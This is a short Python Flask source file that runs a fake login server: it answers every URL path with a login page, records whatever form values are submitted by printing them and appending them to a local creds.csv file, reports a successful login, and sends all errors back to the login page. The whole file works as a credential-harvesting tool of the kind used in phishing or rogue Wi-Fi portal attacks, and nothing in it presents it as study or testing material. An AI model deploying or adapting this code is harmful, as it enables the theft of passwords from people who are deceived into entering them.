import sys

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 8080
CREDS_FILE = "creds.csv"


@app.errorhandler(Exception)
def error_handler(error: Exception):
    """Catch all errors and redirect to login page."""
    return redirect(url_for("login"))


@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def login(path: str = ""):
    """Return login page and store credentials."""
    if request.method == "POST":
        data = tuple(request.form.values())
        print(f"Received credentials: {','.join(data)}")
        with open(CREDS_FILE, "a") as fd:
            fd.write(f"{','.join(data)}\n")
        return render_template("login_successful.html")
    return render_template("login.html")


if __name__ == "__main__":
    try:
        host, port = sys.argv[1], int(sys.argv[2])
    except IndexError:
        host, port = DEFAULT_HOST, DEFAULT_PORT
    app.run(host, port)
